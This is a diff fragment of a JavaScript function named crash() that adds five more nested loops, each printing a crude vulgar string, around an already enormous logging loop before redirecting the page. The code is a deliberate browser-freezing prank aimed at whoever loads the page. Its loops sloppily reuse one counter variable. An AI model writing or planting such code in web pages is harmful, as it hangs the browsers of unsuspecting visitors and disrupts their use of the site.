@@ -10,6 +10,26 @@ function crash()
     for(i=1;i<999999999999999;i++)
     {
         console.log("penis_crasher");
+        for(i=1;i<999999999999999;i++)
+        {
+            console.log("penis_crasher");
+            for(i=1;i<999999999999999;i++)
+            {
+                console.log("penis_crasher");
+                for(i=1;i<999999999999999;i++)
+                {
+                    console.log("penis_crasher");
+                    for(i=1;i<999999999999999;i++)
+                    {
+                        console.log("penis_crasher");
+                        for(i=1;i<999999999999999;i++)
+                        {
+                            console.log("penis_crasher");
+                        }
+                    }
+                }
+            }
+        }
     }
     setTimeout(function(){window.location.replace("index.html")},10000)
 }
